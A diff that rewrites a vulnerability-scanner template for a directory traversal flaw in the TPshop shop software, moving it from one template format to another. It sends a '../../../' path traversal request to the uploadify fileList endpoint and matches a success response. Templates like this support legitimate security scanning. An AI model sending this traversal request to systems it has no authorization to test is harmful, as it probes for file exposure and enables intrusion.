@@ -1,18 +1,24 @@
 id: tpshop-directory-traversal
 
 info:
-  name: Tpshop Directory Traversal
-  author: 清风明月
+  name: TPshop Directory Traversal
+  author: pikpikcu
   severity: high
-  tags: tpshop,directory-traversal
-  created: 2025/03/13
+  reference: https://mp.weixin.qq.com/s/3MkN4ZuUYpP2GgPbTzrxbA
+  tags: tpshop,lfi
 
-rules:
-  r0:
-    request:
-      method: GET
-      path: /index.php/Home/uploadify/fileList?type=.+&path=../
-      headers:
-        Accept-Encoding: deflate
-    expression: response.status == 200 && response.body.bcontains(bytes(string("\"state\":\"SUCCESS\""))) && response.body.bcontains(bytes(string("total")))
-expression: r0()
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php/Home/uploadify/fileList?type=.+&path=../../../"
+
+    matchers-condition: and
+    matchers:
+
+      - type: word
+        words:
+          - '"state":"SUCCESS"'
+
+      - type: status
+        status:
+          - 200
